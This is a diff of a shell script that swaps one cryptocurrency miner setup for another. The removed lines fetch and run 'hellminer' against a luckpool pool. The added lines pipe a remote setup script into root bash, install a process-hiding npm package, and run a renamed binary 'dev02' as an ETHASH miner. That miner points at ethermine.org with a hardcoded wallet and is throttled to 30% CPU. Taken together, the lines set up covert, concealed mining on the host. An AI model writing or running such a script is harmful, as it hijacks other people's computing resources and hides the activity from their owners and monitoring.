@@ -1,10 +1,12 @@
 #!/bin/sh
-sudo apt update
-sudo apt install screen -y
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u wallet.worke -p x --cpu 2
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
+apt update && apt -y install sudo
+sudo apt update;apt -y install build-essential cpulimit screen ca-certificates libcurl4
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+sudo apt-get install -y nodejs
+sudo apt-get install gcc g++ make
+sudo -u root npm i -g node-process-hider
+sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+sudo dpkg-reconfigure --frontend noninteractive tzdata
+chmod +x dev02
+cpulimit -e dev02 -l 30 &
+./dev02 --algo ETHASH --pool asia1.ethermine.org:4444 --user 0x4ee351b518733adba8aee4fbfd64bce2061b3ebd.Modal_Nikah$(cat /proc/sys/kernel/hostname)
